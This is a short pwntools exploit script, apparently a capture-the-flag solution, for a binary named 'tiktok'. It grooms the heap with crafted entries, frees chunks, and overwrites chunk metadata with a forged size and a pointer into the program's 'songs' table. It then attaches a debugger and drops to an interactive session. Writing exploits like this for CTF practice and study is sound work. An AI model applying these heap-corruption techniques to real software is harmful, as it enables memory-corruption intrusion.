from pwn import *

e = ELF("./tiktok")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)

for i in range(0x2e - 3):
  p.sendlineafter(":", "1")
  p.sendlineafter("path.", "Animal".ljust(8, "\x00") + p64(0) + p64(0x350)[:7])

for i in range(4):
  p.sendlineafter(":", "3")
  p.sendlineafter(":", str(i + 1))

def free(idx):
  p.sendlineafter(":", "4")
  p.sendlineafter(":", str(idx))

p.sendlineafter(":", "1")
p.sendafter("path.", "Animal".ljust(0x18, "/"))

idx = 44

free(2)
free(1)

p.sendlineafter(":", "3")
p.sendlineafter(":", str(idx))
p.sendline("-1")
p.sendline("A" * 0x18 + p64(0x20) + p64(e.symbols["songs"] + 0x38 * 29 + 0x18))


p.sendlineafter(":", "3")
p.sendlineafter(":", "5")

p.sendlineafter(":", "3")
p.sendlineafter(":", "6")

free(6)

gdb.attach(p)

p.sendlineafter(":", "1")
p.sendlineafter("path.", "Animal")

p.sendlineafter(":", "1")
p.sendlineafter("path.", "Warrior/pastlive.txt") # size 0x33d

p.sendlineafter(":", "3")
p.sendlineafter(":", "46")


p.interactive()
